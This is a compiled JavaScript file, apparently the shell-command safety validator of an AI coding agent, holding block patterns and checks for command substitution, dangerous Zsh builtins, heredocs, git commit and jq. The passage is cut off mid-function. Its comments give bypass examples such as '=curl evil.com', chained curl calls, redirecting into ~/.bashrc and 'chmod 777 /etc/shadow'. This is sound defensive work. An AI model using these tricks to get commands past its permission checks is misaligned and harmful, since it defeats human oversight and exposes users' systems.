"use strict";
var __assign = (this && this.__assign) || function () {
    __assign = Object.assign || function(t) {
        for (var s, i = 1, n = arguments.length; i < n; i++) {
            s = arguments[i];
            for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p))
                t[p] = s[p];
        }
        return t;
    };
    return __assign.apply(this, arguments);
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g = Object.create((typeof Iterator === "function" ? Iterator : Object).prototype);
    return g.next = verb(0), g["throw"] = verb(1), g["return"] = verb(2), typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
var __spreadArray = (this && this.__spreadArray) || function (to, from, pack) {
    if (pack || arguments.length === 2) for (var i = 0, l = from.length, ar; i < l; i++) {
        if (ar || !(i in from)) {
            if (!ar) ar = Array.prototype.slice.call(from, 0, i);
            ar[i] = from[i];
        }
    }
    return to.concat(ar || Array.prototype.slice.call(from));
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.stripSafeHeredocSubstitutions = stripSafeHeredocSubstitutions;
exports.hasSafeHeredocSubstitution = hasSafeHeredocSubstitution;
exports.bashCommandIsSafe_DEPRECATED = bashCommandIsSafe_DEPRECATED;
exports.bashCommandIsSafeAsync_DEPRECATED = bashCommandIsSafeAsync_DEPRECATED;
var index_js_1 = require("src/services/analytics/index.js");
var heredoc_js_1 = require("../../utils/bash/heredoc.js");
var ParsedCommand_js_1 = require("../../utils/bash/ParsedCommand.js");
var shellQuote_js_1 = require("../../utils/bash/shellQuote.js");
var HEREDOC_IN_SUBSTITUTION = /\$\(.*<</;
// Note: Backtick pattern is handled separately in validateDangerousPatterns
// to distinguish between escaped and unescaped backticks
var COMMAND_SUBSTITUTION_PATTERNS = [
    { pattern: /<\(/, message: 'process substitution <()' },
    { pattern: />\(/, message: 'process substitution >()' },
    { pattern: /=\(/, message: 'Zsh process substitution =()' },
    // Zsh EQUALS expansion: =cmd at word start expands to $(which cmd).
    // `=curl evil.com` → `/usr/bin/curl evil.com`, bypassing Bash(curl:*) deny
    // rules since the parser sees `=curl` as the base command, not `curl`.
    // Only matches word-initial = followed by a command-name char (not VAR=val).
    {
        pattern: /(?:^|[\s;&|])=[a-zA-Z_]/,
        message: 'Zsh equals expansion (=cmd)',
    },
    { pattern: /\$\(/, message: '$() command substitution' },
    { pattern: /\$\{/, message: '${} parameter substitution' },
    { pattern: /\$\[/, message: '$[] legacy arithmetic expansion' },
    { pattern: /~\[/, message: 'Zsh-style parameter expansion' },
    { pattern: /\(e:/, message: 'Zsh-style glob qualifiers' },
    { pattern: /\(\+/, message: 'Zsh glob qualifier with command execution' },
    {
        pattern: /\}\s*always\s*\{/,
        message: 'Zsh always block (try/always construct)',
    },
    // Defense in depth: Block PowerShell comment syntax even though we don't execute in PowerShell
    // Added as protection against future changes that might introduce PowerShell execution
    { pattern: /<#/, message: 'PowerShell comment syntax' },
];
// Zsh-specific dangerous commands that can bypass security checks.
// These are checked against the base command (first word) of each command segment.
var ZSH_DANGEROUS_COMMANDS = new Set([
    // zmodload is the gateway to many dangerous module-based attacks:
    // zsh/mapfile (invisible file I/O via array assignment),
    // zsh/system (sysopen/syswrite two-step file access),
    // zsh/zpty (pseudo-terminal command execution),
    // zsh/net/tcp (network exfiltration via ztcp),
    // zsh/files (builtin rm/mv/ln/chmod that bypass binary checks)
    'zmodload',
    // emulate with -c flag is an eval-equivalent that executes arbitrary code
    'emulate',
    // Zsh module builtins that enable dangerous operations.
    // These require zmodload first, but we block them as defense-in-depth
    // in case zmodload is somehow bypassed or the module is pre-loaded.
    'sysopen', // Opens files with fine-grained control (zsh/system)
    'sysread', // Reads from file descriptors (zsh/system)
    'syswrite', // Writes to file descriptors (zsh/system)
    'sysseek', // Seeks on file descriptors (zsh/system)
    'zpty', // Executes commands on pseudo-terminals (zsh/zpty)
    'ztcp', // Creates TCP connections for exfiltration (zsh/net/tcp)
    'zsocket', // Creates Unix/TCP sockets (zsh/net/socket)
    'mapfile', // Not actually a command, but the associative array is set via zmodload
    'zf_rm', // Builtin rm from zsh/files
    'zf_mv', // Builtin mv from zsh/files
    'zf_ln', // Builtin ln from zsh/files
    'zf_chmod', // Builtin chmod from zsh/files
    'zf_chown', // Builtin chown from zsh/files
    'zf_mkdir', // Builtin mkdir from zsh/files
    'zf_rmdir', // Builtin rmdir from zsh/files
    'zf_chgrp', // Builtin chgrp from zsh/files
]);
// Numeric identifiers for bash security checks (to avoid logging strings)
var BASH_SECURITY_CHECK_IDS = {
    INCOMPLETE_COMMANDS: 1,
    JQ_SYSTEM_FUNCTION: 2,
    JQ_FILE_ARGUMENTS: 3,
    OBFUSCATED_FLAGS: 4,
    SHELL_METACHARACTERS: 5,
    DANGEROUS_VARIABLES: 6,
    NEWLINES: 7,
    DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
    DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
    DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
    IFS_INJECTION: 11,
    GIT_COMMIT_SUBSTITUTION: 12,
    PROC_ENVIRON_ACCESS: 13,
    MALFORMED_TOKEN_INJECTION: 14,
    BACKSLASH_ESCAPED_WHITESPACE: 15,
    BRACE_EXPANSION: 16,
    CONTROL_CHARACTERS: 17,
    UNICODE_WHITESPACE: 18,
    MID_WORD_HASH: 19,
    ZSH_DANGEROUS_COMMANDS: 20,
    BACKSLASH_ESCAPED_OPERATORS: 21,
    COMMENT_QUOTE_DESYNC: 22,
    QUOTED_NEWLINE: 23,
};
function extractQuotedContent(command, isJq) {
    if (isJq === void 0) { isJq = false; }
    var withDoubleQuotes = '';
    var fullyUnquoted = '';
    var unquotedKeepQuoteChars = '';
    var inSingleQuote = false;
    var inDoubleQuote = false;
    var escaped = false;
    for (var i = 0; i < command.length; i++) {
        var char = command[i];
        if (escaped) {
            escaped = false;
            if (!inSingleQuote)
                withDoubleQuotes += char;
            if (!inSingleQuote && !inDoubleQuote)
                fullyUnquoted += char;
            if (!inSingleQuote && !inDoubleQuote)
                unquotedKeepQuoteChars += char;
            continue;
        }
        if (char === '\\' && !inSingleQuote) {
            escaped = true;
            if (!inSingleQuote)
                withDoubleQuotes += char;
            if (!inSingleQuote && !inDoubleQuote)
                fullyUnquoted += char;
            if (!inSingleQuote && !inDoubleQuote)
                unquotedKeepQuoteChars += char;
            continue;
        }
        if (char === "'" && !inDoubleQuote) {
            inSingleQuote = !inSingleQuote;
            unquotedKeepQuoteChars += char;
            continue;
        }
        if (char === '"' && !inSingleQuote) {
            inDoubleQuote = !inDoubleQuote;
            unquotedKeepQuoteChars += char;
            // For jq, include quotes in extraction to ensure content is properly analyzed
            if (!isJq)
                continue;
        }
        if (!inSingleQuote)
            withDoubleQuotes += char;
        if (!inSingleQuote && !inDoubleQuote)
            fullyUnquoted += char;
        if (!inSingleQuote && !inDoubleQuote)
            unquotedKeepQuoteChars += char;
    }
    return { withDoubleQuotes: withDoubleQuotes, fullyUnquoted: fullyUnquoted, unquotedKeepQuoteChars: unquotedKeepQuoteChars };
}
function stripSafeRedirections(content) {
    // SECURITY: All three patterns MUST have a trailing boundary (?=\s|$).
    // Without it, `> /dev/nullo` matches `/dev/null` as a PREFIX, strips
    // `> /dev/null` leaving `o`, so `echo hi > /dev/nullo` becomes `echo hi o`.
    // validateRedirections then sees no `>` and passes. The file write to
    // /dev/nullo is auto-allowed via the read-only path (checkReadOnlyConstraints).
    // Main bashPermissions flow is protected (checkPathConstraints validates the
    // original command), but speculation.ts uses checkReadOnlyConstraints alone.
    return content
        .replace(/\s+2\s*>&\s*1(?=\s|$)/g, '')
        .replace(/[012]?\s*>\s*\/dev\/null(?=\s|$)/g, '')
        .replace(/\s*<\s*\/dev\/null(?=\s|$)/g, '');
}
/**
 * Checks if content contains an unescaped occurrence of a single character.
 * Handles bash escape sequences correctly where a backslash escapes the following character.
 *
 * IMPORTANT: This function only handles single characters, not strings. If you need to extend
 * this to handle multi-character strings, be EXTREMELY CAREFUL about shell ANSI-C quoting
 * (e.g., $'\n', $'\x41', $'\u0041') which can encode arbitrary characters and strings in ways
 * that are very difficult to parse correctly. Incorrect handling could introduce security
 * vulnerabilities by allowing attackers to bypass security checks.
 *
 * @param content - The string to search (typically from extractQuotedContent)
 * @param char - Single character to search for (e.g., '`')
 * @returns true if unescaped occurrence found, false otherwise
 *
 * Examples:
 *   hasUnescapedChar("test \`safe\`", '`') → false (escaped backticks)
 *   hasUnescapedChar("test `dangerous`", '`') → true (unescaped backticks)
 *   hasUnescapedChar("test\\`date`", '`') → true (escaped backslash + unescaped backtick)
 */
function hasUnescapedChar(content, char) {
    if (char.length !== 1) {
        throw new Error('hasUnescapedChar only works with single characters');
    }
    var i = 0;
    while (i < content.length) {
        // If we see a backslash, skip it and the next character (they form an escape sequence)
        if (content[i] === '\\' && i + 1 < content.length) {
            i += 2; // Skip backslash and escaped character
            continue;
        }
        // Check if current character matches
        if (content[i] === char) {
            return true; // Found unescaped occurrence
        }
        i++;
    }
    return false; // No unescaped occurrences found
}
function validateEmpty(context) {
    if (!context.originalCommand.trim()) {
        return {
            behavior: 'allow',
            updatedInput: { command: context.originalCommand },
            decisionReason: { type: 'other', reason: 'Empty command is safe' },
        };
    }
    return { behavior: 'passthrough', message: 'Command is not empty' };
}
function validateIncompleteCommands(context) {
    var originalCommand = context.originalCommand;
    var trimmed = originalCommand.trim();
    if (/^\s*\t/.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
            subId: 1,
        });
        return {
            behavior: 'ask',
            message: 'Command appears to be an incomplete fragment (starts with tab)',
        };
    }
    if (trimmed.startsWith('-')) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
            subId: 2,
        });
        return {
            behavior: 'ask',
            message: 'Command appears to be an incomplete fragment (starts with flags)',
        };
    }
    if (/^\s*(&&|\|\||;|>>?|<)/.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
            subId: 3,
        });
        return {
            behavior: 'ask',
            message: 'Command appears to be a continuation line (starts with operator)',
        };
    }
    return { behavior: 'passthrough', message: 'Command appears complete' };
}
/**
 * Checks if a command is a "safe" heredoc-in-substitution pattern that can
 * bypass the generic $() validator.
 *
 * This is an EARLY-ALLOW path: returning `true` causes bashCommandIsSafe to
 * return `passthrough`, bypassing ALL subsequent validators. Given this
 * authority, the check must be PROVABLY safe, not "probably safe".
 *
 * The only pattern we allow is:
 *   [prefix] $(cat <<'DELIM'\n
 *   [body lines]\n
 *   DELIM\n
 *   ) [suffix]
 *
 * Where:
 * - The delimiter must be single-quoted ('DELIM') or escaped (\DELIM) so the
 *   body is literal text with no expansion
 * - The closing delimiter must be on a line BY ITSELF (or with only trailing
 *   whitespace + `)` for the $(cat <<'EOF'\n...\nEOF)` inline form)
 * - The closing delimiter must be the FIRST such line — matching bash's
 *   behavior exactly (no skipping past early delimiters to find EOF))
 * - There must be non-whitespace text BEFORE the $( (i.e., the substitution
 *   is used in argument position, not as a command name). Otherwise the
 *   heredoc body becomes an arbitrary command name with [suffix] as args.
 * - The remaining text (with the heredoc stripped) must pass all validators
 *
 * This implementation uses LINE-BASED matching, not regex [\s\S]*?, to
 * precisely replicate bash's heredoc-closing behavior.
 */
function isSafeHeredoc(command) {
    var _a, _b;
    if (!HEREDOC_IN_SUBSTITUTION.test(command))
        return false;
    // SECURITY: Use [ \t] (not \s) between << and the delimiter. \s matches
    // newlines, but bash requires the delimiter word on the same line as <<.
    // Matching across newlines could accept malformed syntax that bash rejects.
    // Handle quote variations: 'EOF', ''EOF'' (splitCommand may mangle quotes).
    var heredocPattern = /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g;
    var match;
    var safeHeredocs = [];
    while ((match = heredocPattern.exec(command)) !== null) {
        var delimiter = match[2] || match[3];
        if (delimiter) {
            safeHeredocs.push({
                start: match.index,
                operatorEnd: match.index + match[0].length,
                delimiter: delimiter,
                isDash: match[1] === '-',
            });
        }
    }
    // If no safe heredoc patterns found, it's not safe
    if (safeHeredocs.length === 0)
        return false;
    var verified = [];
    for (var _i = 0, safeHeredocs_1 = safeHeredocs; _i < safeHeredocs_1.length; _i++) {
        var _c = safeHeredocs_1[_i], start = _c.start, operatorEnd = _c.operatorEnd, delimiter = _c.delimiter, isDash = _c.isDash;
        // The opening line must end immediately after the delimiter (only
        // horizontal whitespace allowed before the newline). If there's other
        // content (like `; rm -rf /`), this is not a simple safe heredoc.
        var afterOperator = command.slice(operatorEnd);
        var openLineEnd = afterOperator.indexOf('\n');
        if (openLineEnd === -1)
            return false; // No content at all
        var openLineTail = afterOperator.slice(0, openLineEnd);
        if (!/^[ \t]*$/.test(openLineTail))
            return false; // Extra content on open line
        // Body starts after the newline
        var bodyStart = operatorEnd + openLineEnd + 1;
        var body = command.slice(bodyStart);
        var bodyLines = body.split('\n');
        // Find the FIRST line that closes the heredoc. There are two valid forms:
        //   1. `DELIM` alone on a line (bash-standard), followed by `)` on the
        //      next line (with only whitespace before it)
        //   2. `DELIM)` on a line (the inline $(cat <<'EOF'\n...\nEOF) form,
        //      where bash's PST_EOFTOKEN closes both heredoc and substitution)
        // For <<-, leading tabs are stripped before matching.
        var closingLineIdx = -1;
        var closeParenLineIdx = -1; // Line index where `)` appears
        var closeParenColIdx = -1; // Column index of `)` on that line
        for (var i = 0; i < bodyLines.length; i++) {
            var rawLine = bodyLines[i];
            var line = isDash ? rawLine.replace(/^\t*/, '') : rawLine;
            // Form 1: delimiter alone on a line
            if (line === delimiter) {
                closingLineIdx = i;
                // The `)` must be on the NEXT line with only whitespace before it
                var nextLine = bodyLines[i + 1];
                if (nextLine === undefined)
                    return false; // No closing `)`
                var parenMatch = nextLine.match(/^([ \t]*)\)/);
                if (!parenMatch)
                    return false; // `)` not at start of next line
                closeParenLineIdx = i + 1;
                closeParenColIdx = parenMatch[1].length; // Position of `)`
                break;
            }
            // Form 2: delimiter immediately followed by `)` (PST_EOFTOKEN form)
            // Only whitespace allowed between delimiter and `)`.
            if (line.startsWith(delimiter)) {
                var afterDelim = line.slice(delimiter.length);
                var parenMatch = afterDelim.match(/^([ \t]*)\)/);
                if (parenMatch) {
                    closingLineIdx = i;
                    closeParenLineIdx = i;
                    // Column is in rawLine (pre-tab-strip), so recompute
                    var tabPrefix = isDash ? ((_b = (_a = rawLine.match(/^\t*/)) === null || _a === void 0 ? void 0 : _a[0]) !== null && _b !== void 0 ? _b : '') : '';
                    closeParenColIdx =
                        tabPrefix.length + delimiter.length + parenMatch[1].length;
                    break;
                }
                // Line starts with delimiter but has other trailing content —
                // this is NOT the closing line (bash requires exact match or EOF`)`).
                // But it's also a red flag: if this were inside $(), bash might
                // close early via PST_EOFTOKEN with other shell metacharacters.
                // We already handle that case in extractHeredocs — here we just
                // reject it as not matching our safe pattern.
                if (/^[)}`|&;(<>]/.test(afterDelim)) {
                    return false; // Ambiguous early-closure pattern
                }
            }
        }
        if (closingLineIdx === -1)
            return false; // No closing delimiter found
        // Compute the absolute end position (one past the `)` character)
        var endPos = bodyStart;
        for (var i = 0; i < closeParenLineIdx; i++) {
            endPos += bodyLines[i].length + 1; // +1 for newline
        }
        endPos += closeParenColIdx + 1; // +1 to include the `)` itself
        verified.push({ start: start, end: endPos });
    }
    // SECURITY: Reject nested matches. The regex finds $(cat <<'X' patterns
    // in RAW TEXT without understanding quoted-heredoc semantics. When the
    // outer heredoc has a quoted delimiter (<<'A'), its body is LITERAL text
    // in bash — any inner $(cat <<'B' is just characters, not a real heredoc.
    // But our regex matches both, producing NESTED ranges. Stripping nested
    // ranges corrupts indices: after stripping the inner range, the outer
    // range's `end` is stale (points past the shrunken string), causing
    // `remaining.slice(end)` to return '' and silently drop any suffix
    // (e.g., `; rm -rf /`). Since all our matched heredocs have quoted/escaped
    // delimiters, a nested match inside the body is ALWAYS literal text —
    // no legitimate user writes this pattern. Bail to safe fallback.
    for (var _d = 0, verified_1 = verified; _d < verified_1.length; _d++) {
        var outer = verified_1[_d];
        for (var _e = 0, verified_2 = verified; _e < verified_2.length; _e++) {
            var inner = verified_2[_e];
            if (inner === outer)
                continue;
            if (inner.start > outer.start && inner.start < outer.end) {
                return false;
            }
        }
    }
    // Strip all verified heredocs from the command, building `remaining`.
    // Process in reverse order so earlier indices stay valid.
    var sortedVerified = __spreadArray([], verified, true).sort(function (a, b) { return b.start - a.start; });
    var remaining = command;
    for (var _f = 0, sortedVerified_1 = sortedVerified; _f < sortedVerified_1.length; _f++) {
        var _g = sortedVerified_1[_f], start = _g.start, end = _g.end;
        remaining = remaining.slice(0, start) + remaining.slice(end);
    }
    // SECURITY: The remaining text must NOT start with only whitespace before
    // the (now-stripped) heredoc position IF there's non-whitespace after it.
    // If the $() is in COMMAND-NAME position (no prefix), its output becomes
    // the command to execute, with any suffix text as arguments:
    //   $(cat <<'EOF'\nchmod\nEOF\n) 777 /etc/shadow
    //   → runs `chmod 777 /etc/shadow`
    // We only allow the substitution in ARGUMENT position: there must be a
    // command word before the $(.
    // After stripping, `remaining` should look like `cmd args... [more args]`.
    // If remaining starts with only whitespace (or is empty), the $() WAS the
    // command — that's only safe if there are no trailing arguments.
    var trimmedRemaining = remaining.trim();
    if (trimmedRemaining.length > 0) {
        // There's a prefix command — good. But verify the original command
        // also had a non-whitespace prefix before the FIRST $( (the heredoc
        // could be one of several; we need the first one's prefix).
        var firstHeredocStart = Math.min.apply(Math, verified.map(function (v) { return v.start; }));
        var prefix = command.slice(0, firstHeredocStart);
        if (prefix.trim().length === 0) {
            // $() is in command-name position but there's trailing text — UNSAFE.
            // The heredoc body becomes the command name, trailing text becomes args.
            return false;
        }
    }
    // Check that remaining text contains only safe characters.
    // After stripping safe heredocs, the remaining text should only be command
    // names, arguments, quotes, and whitespace. Reject ANY shell metacharacter
    // to prevent operators (|, &, &&, ||, ;) or expansions ($, `, {, <, >) from
    // being used to chain dangerous commands after a safe heredoc.
    // SECURITY: Use explicit ASCII space/tab only — \s matches unicode whitespace
    // like \u00A0 which can be used to hide content. Newlines are also blocked
    // (they would indicate multi-line commands outside the heredoc body).
    if (!/^[a-zA-Z0-9 \t"'.\-/_@=,:+~]*$/.test(remaining))
        return false;
    // SECURITY: The remaining text (command with heredocs stripped) must also
    // pass all security validators. Without this, appending a safe heredoc to a
    // dangerous command (e.g., `zmodload zsh/system $(cat <<'EOF'\nx\nEOF\n)`)
    // causes this early-allow path to return passthrough, bypassing
    // validateZshDangerousCommands, validateProcEnvironAccess, and any other
    // main validator that checks allowlist-safe character patterns.
    // No recursion risk: `remaining` has no `$(... <<` pattern, so the recursive
    // call's validateSafeCommandSubstitution returns passthrough immediately.
    if (bashCommandIsSafe_DEPRECATED(remaining).behavior !== 'passthrough')
        return false;
    return true;
}
/**
 * Detects well-formed $(cat <<'DELIM'...DELIM) heredoc substitution patterns.
 * Returns the command with matched heredocs stripped, or null if none found.
 * Used by the pre-split gate to strip safe heredocs and re-check the remainder.
 */
function stripSafeHeredocSubstitutions(command) {
    if (!HEREDOC_IN_SUBSTITUTION.test(command))
        return null;
    var heredocPattern = /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g;
    var result = command;
    var found = false;
    var match;
    var ranges = [];
    while ((match = heredocPattern.exec(command)) !== null) {
        if (match.index > 0 && command[match.index - 1] === '\\')
            continue;
        var delimiter = match[2] || match[3];
        if (!delimiter)
            continue;
        var isDash = match[1] === '-';
        var operatorEnd = match.index + match[0].length;
        var afterOperator = command.slice(operatorEnd);
        var openLineEnd = afterOperator.indexOf('\n');
        if (openLineEnd === -1)
            continue;
        if (!/^[ \t]*$/.test(afterOperator.slice(0, openLineEnd)))
            continue;
        var bodyStart = operatorEnd + openLineEnd + 1;
        var bodyLines = command.slice(bodyStart).split('\n');
        for (var i = 0; i < bodyLines.length; i++) {
            var rawLine = bodyLines[i];
            var line = isDash ? rawLine.replace(/^\t*/, '') : rawLine;
            if (line.startsWith(delimiter)) {
                var after = line.slice(delimiter.length);
                var closePos = -1;
                if (/^[ \t]*\)/.test(after)) {
                    var lineStart = bodyStart +
                        bodyLines.slice(0, i).join('\n').length +
                        (i > 0 ? 1 : 0);
                    closePos = command.indexOf(')', lineStart);
                }
                else if (after === '') {
                    var nextLine = bodyLines[i + 1];
                    if (nextLine !== undefined && /^[ \t]*\)/.test(nextLine)) {
                        var nextLineStart = bodyStart + bodyLines.slice(0, i + 1).join('\n').length + 1;
                        closePos = command.indexOf(')', nextLineStart);
                    }
                }
                if (closePos !== -1) {
                    ranges.push({ start: match.index, end: closePos + 1 });
                    found = true;
                }
                break;
            }
        }
    }
    if (!found)
        return null;
    for (var i = ranges.length - 1; i >= 0; i--) {
        var r = ranges[i];
        result = result.slice(0, r.start) + result.slice(r.end);
    }
    return result;
}
/** Detection-only check: does the command contain a safe heredoc substitution? */
function hasSafeHeredocSubstitution(command) {
    return stripSafeHeredocSubstitutions(command) !== null;
}
function validateSafeCommandSubstitution(context) {
    var originalCommand = context.originalCommand;
    if (!HEREDOC_IN_SUBSTITUTION.test(originalCommand)) {
        return { behavior: 'passthrough', message: 'No heredoc in substitution' };
    }
    if (isSafeHeredoc(originalCommand)) {
        return {
            behavior: 'allow',
            updatedInput: { command: originalCommand },
            decisionReason: {
                type: 'other',
                reason: 'Safe command substitution: cat with quoted/escaped heredoc delimiter',
            },
        };
    }
    return {
        behavior: 'passthrough',
        message: 'Command substitution needs validation',
    };
}
function validateGitCommit(context) {
    var originalCommand = context.originalCommand, baseCommand = context.baseCommand;
    if (baseCommand !== 'git' || !/^git\s+commit\s+/.test(originalCommand)) {
        return { behavior: 'passthrough', message: 'Not a git commit' };
    }
    // SECURITY: Backslashes can cause our regex to mis-identify quote boundaries
    // (e.g., `git commit -m "test\"msg" && evil`). Legitimate commit messages
    // virtually never contain backslashes, so bail to the full validator chain.
    if (originalCommand.includes('\\')) {
        return {
            behavior: 'passthrough',
            message: 'Git commit contains backslash, needs full validation',
        };
    }
    // SECURITY: The `.*?` before `-m` must NOT match shell operators. Previously
    // `.*?` matched anything except `\n`, including `;`, `&`, `|`, `` ` ``, `$(`.
    // For `git commit ; curl evil.com -m 'x'`, `.*?` swallowed `; curl evil.com `
    // leaving remainder=`` (falsy → remainder check skipped) → returned `allow`
    // for a compound command. Early-allow skips ALL main validators (line ~1908),
    // nullifying validateQuotedNewline, validateBackslashEscapedOperators, etc.
    // While splitCommand currently catches this downstream, early-allow is a
    // POSITIVE ASSERTION that the FULL command is safe — which it is NOT.
    //
    // Also: `\s+` between `git` and `commit` must NOT match `\n`/`\r` (command
    // separators in bash). Use `[ \t]+` for horizontal-only whitespace.
    //
    // The `[^;&|`$<>()\n\r]*?` class excludes shell metacharacters. We also
    // exclude `<` and `>` here (redirects) — they're allowed in the REMAINDER
    // for `--author="Name <email>"` but must not appear BEFORE `-m`.
    var messageMatch = originalCommand.match(/^git[ \t]+commit[ \t]+[^;&|`$<>()\n\r]*?-m[ \t]+(["'])([\s\S]*?)\1(.*)$/);
    if (messageMatch) {
        var quote = messageMatch[1], messageContent = messageMatch[2], remainder = messageMatch[3];
        if (quote === '"' && messageContent && /\$\(|`|\$\{/.test(messageContent)) {
            (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
                checkId: BASH_SECURITY_CHECK_IDS.GIT_COMMIT_SUBSTITUTION,
                subId: 1,
            });
            return {
                behavior: 'ask',
                message: 'Git commit message contains command substitution patterns',
            };
        }
        // SECURITY: Check remainder for shell operators that could chain commands
        // or redirect output. The `.*` before `-m` in the regex can swallow flags
        // like `--amend`, leaving `&& evil` or `> ~/.bashrc` in the remainder.
        // Previously we only checked for $() / `` / ${} here, missing operators
        // like ; | & && || < >.
        //
        // `<` and `>` can legitimately appear INSIDE quotes in --author values
        // like `--author="Name <email>"`. An UNQUOTED `>` is a shell redirect
        // operator. Because validateGitCommit is an EARLY validator, returning
        // `allow` here short-circuits bashCommandIsSafe and SKIPS
        // validateRedirections. So we must bail to passthrough on unquoted `<>`
        // to let the main validators handle it.
        //
        // Attack: `git commit --allow-empty -m 'payload' > ~/.bashrc`
        //   validateGitCommit returns allow → bashCommandIsSafe short-circuits →
        //   validateRedirections NEVER runs → ~/.bashrc overwritten with git
        //   stdout containing `payload` → RCE on next shell login.
        if (remainder && /[;|&()`]|\$\(|\$\{/.test(remainder)) {
            return {
                behavior: 'passthrough',
                message: 'Git commit remainder contains shell metacharacters',
            };
        }
        if (remainder) {
            // Strip quoted content, then check for `<` or `>`. Quoted `<>` (email
            // brackets in --author) are safe; unquoted `<>` are shell redirects.
            // NOTE: This simple quote tracker has NO backslash handling. `\'`/`\"`
            // outside quotes would desync it (bash: \' = literal ', tracker: toggles
            // SQ). BUT line 584 already bailed on ANY backslash in originalCommand,
            // so we never reach here with backslashes. For backslash-free input,
            // simple quote toggling is correct (no way to escape quotes without \\).
            var unquoted = '';
            var inSQ = false;
            var inDQ = false;
            for (var i = 0; i < remainder.length; i++) {
                var c = remainder[i];
                if (c === "'" && !inDQ) {
                    inSQ = !inSQ;
                    continue;
                }
                if (c === '"' && !inSQ) {
                    inDQ = !inDQ;
                    continue;
                }
                if (!inSQ && !inDQ)
                    unquoted += c;
            }
            if (/[<>]/.test(unquoted)) {
                return {
                    behavior: 'passthrough',
                    message: 'Git commit remainder contains unquoted redirect operator',
                };
            }
        }
        // Security hardening: block messages starting with dash
        // This catches potential obfuscation patterns like git commit -m "---"
        if (messageContent && messageContent.startsWith('-')) {
            (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
                checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
                subId: 5,
            });
            return {
                behavior: 'ask',
                message: 'Command contains quoted characters in flag names',
            };
        }
        return {
            behavior: 'allow',
            updatedInput: { command: originalCommand },
            decisionReason: {
                type: 'other',
                reason: 'Git commit with simple quoted message is allowed',
            },
        };
    }
    return { behavior: 'passthrough', message: 'Git commit needs validation' };
}
function validateJqCommand(context) {
    var originalCommand = context.originalCommand, baseCommand = context.baseCommand;
    if (baseCommand !== 'jq') {
        return { behavior: 'passthrough', message: 'Not jq' };
    }
    if (/\bsystem\s*\(/.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.JQ_SYSTEM_FUNCTION,
            subId: 1,
        });
        return {
            behavior: 'ask',
            message: 'jq command contains system() function which executes arbitrary commands',
        };
    }
    // File arguments are now allowed - they will be validated by path validation in readOnlyValidation.ts
    // Only block dangerous flags that could read files into jq variables
    var afterJq = originalCommand.substring(3).trim();
    if (/(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)/.test(afterJq)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.JQ_FILE_ARGUMENTS,
            subId: 1,
        });
        return {
            behavior: 'ask',
            message: 'jq command contains dangerous flags that could execute code or read arbitrary files',
        };
    }
    return { behavior: 'passthrough', message: 'jq command is safe' };
}
function validateShellMetacharacters(context) {
    var unquotedContent = context.unquotedContent;
    var message = 'Command contains shell metacharacters (;, |, or &) in arguments';
    if (/(?:^|\s)["'][^"']*[;&][^"']*["'](?:\s|$)/.test(unquotedContent)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
            subId: 1,
        });
        return { behavior: 'ask', message: message };
    }
    var globPatterns = [
